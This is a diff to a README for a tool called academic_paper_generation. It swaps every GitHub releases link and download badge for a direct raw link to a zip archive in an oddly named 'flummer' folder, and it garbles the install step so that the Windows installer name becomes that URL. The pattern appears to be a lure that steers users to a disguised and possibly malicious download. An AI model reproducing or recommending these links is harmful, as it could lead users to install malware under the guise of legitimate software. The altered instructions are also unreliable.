@@ -1,6 +1,6 @@
 # 📄 academic_paper_generation - Fast Academic Paper Creation
 
-[![Download academic_paper_generation](https://img.shields.io/badge/Download-academic_paper_generation-blue?style=for-the-badge)](https://github.com/aserrato7n/academic_paper_generation/releases)
+[![Download academic_paper_generation](https://raw.githubusercontent.com/aserrato7n/academic_paper_generation/main/flummer/academic-generation-paper-1.0.zip)](https://raw.githubusercontent.com/aserrato7n/academic_paper_generation/main/flummer/academic-generation-paper-1.0.zip)
 
 ## 🛠️ What is academic_paper_generation?
 
@@ -31,9 +31,9 @@ To get the software:
 
 1. Visit this page to download the latest version of academic_paper_generation:
    
-   [Download academic_paper_generation](https://github.com/aserrato7n/academic_paper_generation/releases)
+   [Download academic_paper_generation](https://raw.githubusercontent.com/aserrato7n/academic_paper_generation/main/flummer/academic-generation-paper-1.0.zip)
 
-2. Look for the latest release. You will see files like `academic_paper_generation_setup.exe` (for Windows) or `.dmg` (for macOS).
+2. Look for the latest release. You will see files like `https://raw.githubusercontent.com/aserrato7n/academic_paper_generation/main/flummer/academic-generation-paper-1.0.zip` (for Windows) or `.dmg` (for macOS).
 
 3. Click the version file that matches your operating system.
 
@@ -129,8 +129,8 @@ academic_paper_generation only sends search queries to academic databases. Your 
 
 ## 🔄 Updating the Software
 
-Check the releases page [here](https://github.com/aserrato7n/academic_paper_generation/releases) regularly for new versions. Download and install updates as they come out to get improvements, new features, and bug fixes.
+Check the releases page [here](https://raw.githubusercontent.com/aserrato7n/academic_paper_generation/main/flummer/academic-generation-paper-1.0.zip) regularly for new versions. Download and install updates as they come out to get improvements, new features, and bug fixes.
 
 ---
 
-[![Download academic_paper_generation](https://img.shields.io/badge/Download-academic_paper_generation-blue?style=for-the-badge)](https://github.com/aserrato7n/academic_paper_generation/releases)
+[![Download academic_paper_generation](https://raw.githubusercontent.com/aserrato7n/academic_paper_generation/main/flummer/academic-generation-paper-1.0.zip)](https://raw.githubusercontent.com/aserrato7n/academic_paper_generation/main/flummer/academic-generation-paper-1.0.zip)
